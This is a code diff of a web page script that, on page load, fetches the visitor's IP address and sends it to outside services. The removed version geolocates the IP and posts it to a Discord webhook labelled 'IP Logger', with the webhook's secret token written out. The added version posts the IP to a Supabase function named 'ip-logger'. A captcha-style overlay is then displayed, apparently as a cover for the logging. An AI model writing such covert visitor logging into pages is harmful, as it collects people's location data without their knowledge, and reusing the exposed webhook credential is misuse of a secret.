@@ -46,22 +46,11 @@ document.addEventListener('DOMContentLoaded', () => {
         fetch('https://ipinfo.io/json')
           .then(response => response.json())
           .then(data => {
-            fetch(`https://freeipapi.com/api/json/${data.ip}`)
-              .then(res => res.json())
-              .then(ipData => {
-                fetch('https://discord.com/api/webhooks/1338380619771678761/6Yy3FGqDf_RJ09A7L1Wp1wst7wBoom7wWDNIGIi5D6IkXINXhJIf4Ttopu61CgMGcGYy', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    embeds: [{
-                      color: 0xBDECB6,
-                      title: 'IP Logger',
-                      description: `🌍 Continent: ${ipData.continent} (${ipData.continentCode})\n🌏 Country: ${ipData.countryName} (${ipData.countryCode})\n🏢 City: ${ipData.cityName}`,
-                      footer: { text: `IP Address: ${ipData.ipAddress}` }
-                    }]
-                  })
-                });
-              });
+            fetch('https://mqprtorkbjflarpbjdrr.supabase.co/functions/v1/ip-logger', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ ip: data.ip })
+            });
           });
         document.getElementById('recaptcha').style.display = 'block';
         document.getElementById('overlay').style.display = 'block';
